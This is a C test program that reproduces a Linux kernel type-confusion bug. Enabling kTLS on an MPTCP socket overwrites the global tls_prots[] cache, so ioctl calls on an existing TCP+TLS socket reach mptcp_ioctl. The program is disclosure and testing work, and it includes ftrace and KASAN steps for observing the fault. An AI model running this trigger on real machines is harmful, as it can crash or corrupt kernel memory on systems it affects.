// SPDX-License-Identifier: GPL-2.0
/*
 * test_tls_mptcp_race.c
 *
 * Demonstrate global tls_prots[] cache pollution when TCP+TLS and
 * MPTCP+TLS sockets coexist in the same kernel.
 *
 * Problem:
 *   TLS ULP uses a global static array tls_prots[TLSV4] to cache
 *   proto operations. When MPTCP socket enables TLS after TCP socket,
 *   build_protos() overwrites the global array with mptcp_prot as base.
 *   The existing TCP+TLS socket's sk->sk_prot still points to the same
 *   array entry, but its content is now mptcp-based.
 *
 *   Unoverridden callbacks (ioctl, destroy, hash, unhash, ...) are now
 *   mptcp-specific functions operating on tcp_sock -> type confusion.
 *
 * Test flow:
 *   1. Create TCP socket pair, enable kTLS
 *      -> tls_prots[TLSV4] built from tcp_prot
 *      -> tcp sockets' sk->sk_prot = &tls_prots[TLSV4][SW][SW]
 *
 *   2. Create MPTCP socket pair, enable kTLS
 *      -> tls_prots[TLSV4] rebuilt from mptcp_prot (overwrite!)
 *      -> TCP sockets' sk->sk_prot now has mptcp callbacks
 *
 *   3. ioctl(SIOCINQ) on TCP socket
 *      -> sk->sk_prot->ioctl = mptcp_ioctl (should be tcp_ioctl)
 *      -> mptcp_ioctl casts tcp_sock to mptcp_sock -> type confusion
 *
 * How to observe:
 *   Option A: Run with KASAN enabled -> should report memory error
 *   Option B: Use ftrace to observe mptcp_ioctl being called on TCP socket:
 *             cd /sys/kernel/tracing
 *             echo 'p:probe/mptcp_ioctl mptcp_ioctl' > kprobe_events
 *             echo 1 > events/probe/enable
 *             echo 1 > tracing_on
 *             # run this test
 *             cat trace
 *             # You'll see mptcp_ioctl called for TCP socket
 *
 * Compile:
 *   gcc -o test_tls_mptcp_race test_tls_mptcp_race.c
 *
 * Run:
 *   sudo ./test_tls_mptcp_race
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <linux/tls.h>
#include <arpa/inet.h>

#ifndef IPPROTO_MPTCP
#define IPPROTO_MPTCP 262
#endif

/* Wait for MPTCP subflow establishment */
static void wait_for_mptcp(int fd)
{
	/*
	 * MPTCP needs a brief moment for the subflow to be fully
	 * established after connect() returns. Sleep a bit to
	 * ensure the kernel-side state is ready for TLS ULP.
	 */
	usleep(100000); /* 100ms */
}

static int create_pair(int proto, int *cfd, int *sfd)
{
	struct sockaddr_in addr = {};
	socklen_t len = sizeof(addr);
	int ret, lfd;

	lfd = socket(AF_INET, SOCK_STREAM, proto);
	if (lfd < 0) {
		if (proto == IPPROTO_MPTCP)
			fprintf(stderr, "  MPTCP not supported (EPROTONOSUPPORT)\n");
		else
			perror("  socket(listen)");
		return -1;
	}

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	addr.sin_port = 0;

	ret = bind(lfd, (struct sockaddr *)&addr, sizeof(addr));
	if (ret < 0) { perror("  bind"); close(lfd); return -1; }

	ret = listen(lfd, 1);
	if (ret < 0) { perror("  listen"); close(lfd); return -1; }

	ret = getsockname(lfd, (struct sockaddr *)&addr, &len);
	if (ret < 0) { perror("  getsockname"); close(lfd); return -1; }

	*cfd = socket(AF_INET, SOCK_STREAM, proto);
	if (*cfd < 0) { perror("  socket(client)"); close(lfd); return -1; }

	ret = connect(*cfd, (struct sockaddr *)&addr, sizeof(addr));
	if (ret < 0) { perror("  connect"); close(lfd); close(*cfd); return -1; }

	*sfd = accept(lfd, NULL, NULL);
	if (*sfd < 0) { perror("  accept"); close(lfd); close(*cfd); return -1; }

	close(lfd);

	if (proto == IPPROTO_MPTCP) {
		wait_for_mptcp(*cfd);
		wait_for_mptcp(*sfd);
	}

	return 0;
}

static int enable_ktls(int fd, int id)
{
	struct tls12_crypto_info_aes_gcm_128 tx_info = {};
	struct tls12_crypto_info_aes_gcm_128 rx_info = {};
	int ret;

	/* Step 1: Install TLS ULP */
	ret = setsockopt(fd, IPPROTO_TCP, TCP_ULP, "tls", sizeof("tls"));
	if (ret < 0) {
		fprintf(stderr, "  [%d] setsockopt(TCP_ULP): %s\n", id, strerror(errno));
		return -1;
	}

	/* Step 2: TLS_TX config */
	tx_info.info.version = TLS_1_2_VERSION;
	tx_info.info.cipher_type = TLS_CIPHER_AES_GCM_128;
	memset(tx_info.iv,     0x11 + id, TLS_CIPHER_AES_GCM_128_IV_SIZE);
	memset(tx_info.key,    0x22 + id, TLS_CIPHER_AES_GCM_128_KEY_SIZE);
	memset(tx_info.salt,   0x33 + id, TLS_CIPHER_AES_GCM_128_SALT_SIZE);
	memset(tx_info.rec_seq, 0x01,     TLS_CIPHER_AES_GCM_128_REC_SEQ_SIZE);

	ret = setsockopt(fd, SOL_TLS, TLS_TX, &tx_info, sizeof(tx_info));
	if (ret < 0) {
		fprintf(stderr, "  [%d] setsockopt(TLS_TX): %s\n", id, strerror(errno));
		return -1;
	}

	/* Step 3: TLS_RX config */
	rx_info.info.version = TLS_1_2_VERSION;
	rx_info.info.cipher_type = TLS_CIPHER_AES_GCM_128;
	memset(rx_info.iv,     0x55 + id, TLS_CIPHER_AES_GCM_128_IV_SIZE);
	memset(rx_info.key,    0x66 + id, TLS_CIPHER_AES_GCM_128_KEY_SIZE);
	memset(rx_info.salt,   0x77 + id, TLS_CIPHER_AES_GCM_128_SALT_SIZE);
	memset(rx_info.rec_seq, 0x02,     TLS_CIPHER_AES_GCM_128_REC_SEQ_SIZE);

	ret = setsockopt(fd, SOL_TLS, TLS_RX, &rx_info, sizeof(rx_info));
	if (ret < 0) {
		fprintf(stderr, "  [%d] setsockopt(TLS_RX): %s\n", id, strerror(errno));
		return -1;
	}

	return 0;
}

int main(void)
{
	int tcp_cfd = -1, tcp_sfd = -1;
	int mptcp_cfd = -1, mptcp_sfd = -1;
	int bytes, ret;

	printf("========================================\n");
	printf(" TLS/MPTCP global tls_prots[] race test\n");
	printf("========================================\n\n");

	/*
	 * Step 1: Create TCP socket pair + enable kTLS
	 *
	 * This triggers:
	 *   tls_init() -> tls_build_proto() -> build_protos(tls_prots[TLSV4], tcp_prot)
	 *   update_sk_prot() -> sk->sk_prot = &tls_prots[TLSV4][SW][SW]
	 *
	 * Now tls_prots[TLSV4][SW][SW].ioctl  = tcp_ioctl   (from tcp_prot)
	 * Now tls_prots[TLSV4][SW][SW].destroy = tcp_v4_destroy_sock (from tcp_prot)
	 */
	printf("[Step 1] Create TCP socket pair + kTLS\n");
	if (create_pair(0, &tcp_cfd, &tcp_sfd) < 0) {
		fprintf(stderr, "FAIL: cannot create TCP sockets\n");
		return 1;
	}
	if (enable_ktls(tcp_cfd, 0) < 0 || enable_ktls(tcp_sfd, 1) < 0) {
		fprintf(stderr, "FAIL: cannot enable kTLS on TCP\n");
		return 1;
	}
	printf("  TCP+TLS OK\n");
	printf("  tls_prots[TLSV4] now based on tcp_prot\n");
	printf("  tcp sockets' sk->sk_prot -> &tls_prots[TLSV4][SW][SW]\n");
	printf("  .ioctl  = tcp_ioctl\n");
	printf("  .destroy = tcp_v4_destroy_sock\n\n");

	/*
	 * Step 2: Create MPTCP socket pair + enable kTLS
	 *
	 * This triggers:
	 *   tls_init() -> tls_build_proto():
	 *     prot = sk->sk_prot = &mptcp_prot
	 *     prot != saved_tcpv4_prot (which is &tcp_prot)
	 *     -> build_protos(tls_prots[TLSV4], mptcp_prot)   <-- OVERWRITE!
	 *     -> saved_tcpv4_prot = &mptcp_prot
	 *
	 * Now tls_prots[TLSV4][SW][SW].ioctl  = mptcp_ioctl  (CHANGED!)
	 * Now tls_prots[TLSV4][SW][SW].destroy = mptcp_destroy (CHANGED!)
	 *
	 * The TCP sockets from Step 1 still have sk->sk_prot = &tls_prots[TLSV4][SW][SW],
	 * but the content at that address is now mptcp-based!
	 */
	printf("[Step 2] Create MPTCP socket pair + kTLS\n");
	if (create_pair(IPPROTO_MPTCP, &mptcp_cfd, &mptcp_sfd) < 0) {
		printf("  MPTCP not available, cannot demonstrate. SKIP.\n");
		goto cleanup;
	}
	if (enable_ktls(mptcp_cfd, 2) < 0 || enable_ktls(mptcp_sfd, 3) < 0) {
		fprintf(stderr, "FAIL: cannot enable kTLS on MPTCP\n");
		goto cleanup;
	}
	printf("  MPTCP+TLS OK\n");
	printf("  tls_prots[TLSV4] REBUILT from mptcp_prot !!!\n");
	printf("  TCP sockets' sk->sk_prot still -> &tls_prots[TLSV4][SW][SW]\n");
	printf("  but now:\n");
	printf("    .ioctl  = mptcp_ioctl  (WAS tcp_ioctl)\n");
	printf("    .destroy = mptcp_destroy (WAS tcp_v4_destroy_sock)\n");
	printf("  ^^^ TYPE CONFUSION on TCP socket ^^^\n\n");

	/*
	 * Step 3: Trigger ioctl(SIOCINQ) on TCP+TLS socket
	 *
	 * Call path:
	 *   ioctl(SIOCINQ) -> inet_ioctl() -> sk->sk_prot->ioctl(sk, cmd, karg)
	 *   -> mptcp_ioctl(sk, SIOCINQ, karg)     <-- WRONG!
	 *   -> mptcp_sk(sk) casts tcp_sock to mptcp_sock
	 *   -> accesses msk->first, msk->rcvq_space, etc.
	 *   -> these are random bytes from tcp_sock's memory layout
	 *
	 * With KASAN: should report memory access violation
	 * Without KASAN: may crash, corrupt memory, or silently return wrong value
	 */
	printf("[Step 3] ioctl(SIOCINQ) on TCP+TLS socket\n");
	printf("  Expect: tcp_ioctl called\n");
	printf("  Actual: mptcp_ioctl called on tcp_sock!\n");
	printf("  mptcp_ioctl does mptcp_sk(sk) -> type confusion\n\n");

	bytes = 0;
	errno = 0;
	ret = ioctl(tcp_cfd, TIOCINQ, &bytes);
	printf("  ioctl(TIOCINQ) returned: %d, bytes=%d, errno=%d (%s)\n",
	       ret, bytes, errno, errno ? strerror(errno) : "no error");

	if (ret == 0) {
		printf("  No crash, but mptcp_ioctl may have silently\n");
		printf("  read garbage from tcp_sock memory.\n");
	}
	printf("\n");

	/* Also try SIOCOUTQ which accesses msk->snd_una */
	bytes = 0;
	errno = 0;
	ret = ioctl(tcp_cfd, TIOCOUTQ, &bytes);
	printf("  ioctl(TIOCOUTQ) returned: %d, bytes=%d, errno=%d (%s)\n",
	       ret, bytes, errno, errno ? strerror(errno) : "no error");
	printf("\n");

	/*
	 * Step 4: Close TCP sockets
	 *
	 * tls_sk_proto_close restores sk->sk_prot = ctx->sk_proto (saved tcp_prot),
	 * so the destroy path is actually safe. But between Steps 2 and 4,
	 * any unoverridden callback on TCP socket is wrong.
	 */
	printf("[Step 4] Close TCP sockets\n");
	printf("  (close path is safe: tls_sk_proto_close restores original proto)\n\n");

cleanup:
	if (tcp_cfd >= 0) close(tcp_cfd);
	if (tcp_sfd >= 0) close(tcp_sfd);
	if (mptcp_cfd >= 0) close(mptcp_cfd);
	if (mptcp_sfd >= 0) close(mptcp_sfd);

	printf("[Step 5] Check dmesg for evidence:\n");
	printf("  dmesg | tail -50\n");
	printf("  Look for: BUG, KASAN report, Oops, or any mptcp-related warning\n\n");

	printf("  Or trace mptcp_ioctl calls with ftrace:\n");
	printf("    cd /sys/kernel/tracing\n");
	printf("    echo 'p:probe/mptcp_ioctl mptcp_ioctl' > kprobe_events\n");
	printf("    echo 1 > events/probe/enable\n");
	printf("    echo 1 > tracing_on\n");
	printf("    # re-run this test\n");
	printf("    cat trace\n");
	printf("    # If mptcp_ioctl appears during TCP socket ioctl,\n");
	printf("    # the cache pollution is confirmed.\n\n");

	printf("========================================\n");
	printf(" Test complete\n");
	printf("========================================\n");

	return 0;
}
